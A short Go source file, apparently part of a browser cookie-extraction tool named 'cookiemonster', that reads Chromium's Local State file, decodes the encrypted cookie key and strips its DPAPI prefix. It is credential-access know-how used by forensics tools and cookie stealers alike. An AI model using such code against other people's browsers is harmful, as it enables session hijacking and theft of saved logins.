package cookiemonster

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
)

type LocalState struct {
	OsCrypt struct {
		EncryptedData string `json:"encrypted_key"`
	} `json:"os_crypt"`
}

func ParseLocalState(stateFile string) ([]byte, error) {
	data, err := os.ReadFile(stateFile)
	if err != nil {
		return nil, fmt.Errorf("failed to read state file: %w", err)
	}

	var localState LocalState
	if err := json.Unmarshal(data, &localState); err != nil {
		return nil, fmt.Errorf("failed to unmarshal state file: %w", err)
	}

	encryptedKey, err := base64.StdEncoding.DecodeString(localState.OsCrypt.EncryptedData)
	if err != nil {
		return nil, err
	}

	return encryptedKey[5:], nil // Remove DPAPI prefix
}
